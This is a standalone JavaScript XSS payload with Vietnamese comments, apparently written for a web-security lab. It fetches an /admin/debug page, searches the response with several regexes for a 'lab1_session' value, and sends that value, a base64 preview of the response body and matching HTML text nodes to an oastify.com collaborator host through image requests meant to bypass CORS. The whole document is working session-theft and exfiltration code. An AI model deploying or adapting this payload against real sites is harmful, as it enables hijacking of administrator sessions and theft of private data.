(async () => {
    try {
        console.log('Đang fetch /admin/debug...');
        const response = await fetch('/admin/debug');
        const text = await response.text(); // QUAN TRỌNG: vẫn lấy được text dù status 500
        console.log('Status:', response.status, 'OK?', response.ok);
        
        // 1. Tìm lab1_session bằng nhiều regex
        let sessionValue = null;
        const patterns = [
            /lab1_session=([^;\s'"<>&]+)/i,
            /lab1_session["']?\s*[:=>]\s*["']([^"']+)/i,
            /lab1_session[^>]*>([^<]+)</i,
            /lab1_session&quot;:&quot;([^&]+)/i,
            /<td[^>]*>lab1_session<\/td>\s*<td[^>]*>([^<]+)/i,
            /\["lab1_session"\] =&gt; "([^"]+)/i
        ];
        
        for (const pattern of patterns) {
            const match = text.match(pattern);
            if (match && match[1] && match[1].length > 5) {
                sessionValue = match[1].trim();
                console.log('Tìm thấy session (pattern match):', sessionValue);
                break;
            }
        }
        
        // 2. Nếu không tìm thấy, thử decode HTML entities
        if (!sessionValue && text.includes('lab1_session')) {
            // Tìm đoạn text xung quanh lab1_session (200 ký tự)
            const idx = text.indexOf('lab1_session');
            const snippet = text.substring(Math.max(0, idx - 100), Math.min(text.length, idx + 300));
            console.log('Snippet chứa lab1_session:', snippet);
        }
        
        // 3. Gửi data về collaborator (dùng img để bypass CORS)
        const domain = 'lpev189ho4ebjqr4wu0l0bammds4g34s.oastify.com';
        
        if (sessionValue) {
            // Gửi session
            new Image().src = `https://${domain}/?s=${encodeURIComponent(sessionValue)}&code=${response.status}`;
            
            // Gửi preview của response body
            const preview = text.substring(0, 1000).replace(/[^\x20-\x7E]/g, '');
            if (preview.length > 50) {
                new Image().src = `https://${domain}/?preview=${encodeURIComponent(btoa(preview))}`;
            }
        } else {
            // Vẫn gửi để debug
            console.log('Không tìm thấy session rõ ràng, gửi mẫu để debug...');
            const sample = text.substring(0, 800);
            new Image().src = `https://${domain}/?nosession=1&sample=${encodeURIComponent(btoa(sample))}`;
        }
        
        // 4. Thử parse như HTML nếu cần
        try {
            const parser = new DOMParser();
            const doc = parser.parseFromString(text, 'text/html');
            
            // Tìm tất cả text nodes chứa lab1_session
            const walker = document.createTreeWalker(
                doc.body,
                NodeFilter.SHOW_TEXT,
                {
                    acceptNode: function(node) {
                        return node.textContent.includes('lab1_session') 
                            ? NodeFilter.FILTER_ACCEPT 
                            : NodeFilter.FILTER_REJECT;
                    }
                }
            );
            
            const nodes = [];
            let node;
            while (node = walker.nextNode()) {
                nodes.push(node.textContent);
            }
            
            if (nodes.length > 0) {
                console.log('Found in HTML text nodes:', nodes);
                // Gửi các nodes này
                new Image().src = `https://${domain}/?nodes=${encodeURIComponent(btoa(JSON.stringify(nodes)))}`;
            }
        } catch (e) {
            // Không parse được HTML, bỏ qua
        }
        
        console.log('Hoàn thành!');
        
    } catch (error) {
        console.error('Có lỗi fetch:', error.message);
    }
})();
